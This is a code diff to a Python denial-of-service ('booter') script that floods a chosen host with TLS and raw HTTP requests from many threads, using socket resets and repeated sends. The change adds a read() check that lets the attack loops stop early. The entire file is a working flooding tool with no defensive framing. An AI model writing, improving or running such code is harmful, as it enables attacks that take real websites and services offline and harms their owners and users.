@@ -1,9 +1,10 @@
 import socket,ssl,threading,struct
-from MODEL.data import get_target,generate_url_path
+from MODEL.data import get_target,generate_url_path,read
 
 def RENEGOTIATE_SEND(ssl_socket,byt2,byt):
    try:
     for _ in range(250):
+        if read() == True:break
         ssl_socket.write(byt2); ssl_socket.sendall(byt2); ssl_socket.send(byt2)
         ssl_socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
         ssl_socket.write(byt); ssl_socket.sendall(byt); ssl_socket.send(byt)
@@ -15,6 +16,7 @@ def RENEGOTIATE_KEY(target,methods,duration_sec_attack_dude,byt):
     for _ in range(int(duration_sec_attack_dude)):
         try:
             for _ in range(500):
+             if read() == True:break
              s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
              s.connect((str(target['host']),int(target['port'])))
              s.connect_ex((str(target['host']),int(target['port'])))
@@ -42,4 +44,7 @@ else:
 target = get_target(url)
 byt = f"{METHODS} {target['uri']} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
 for _ in range(int(thread_lower)):
-   for _ in range(10):threading.Thread(target=RENEGOTIATE_KEY,args=(target,METHODS,time_booter,byt)).start()
+   if read() == True:break
+   for _ in range(10):
+      if read() == True:break
+      threading.Thread(target=RENEGOTIATE_KEY,args=(target,METHODS,time_booter,byt)).start()
